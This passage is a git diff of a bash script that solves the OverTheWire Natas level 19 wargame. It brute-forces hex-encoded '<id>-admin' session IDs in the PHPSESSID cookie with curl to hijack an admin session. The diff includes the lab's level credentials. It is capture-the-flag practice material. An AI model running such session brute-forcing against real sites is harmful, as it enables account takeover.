@@ -1,15 +1,20 @@
+#session_prediction
 #!/bin/bash
 
-url=http://natas18.natas.labs.overthewire.org/
-auth="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+url=http://natas19.natas.labs.overthewire.org/index.php
+auth="natas19:tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr"
 success="You are an admin. The credentials for the next level*"
+
 
 for id in {0..641}
 do
-    echo "id: $id"
+    sesid="$id-admin"
+    echo "Sesid: $sesid"
+    hexid=$(echo -n "$sesid" | xxd -ps)
+    echo "Hex: $hexid"
     if(curl \
     -u $auth \
-    -b "PHPSESSID=$id" \
+    -b "PHPSESSID=$hexid" \
     -s \
     -o 2>/dev/null \
     -d "username=admin" \
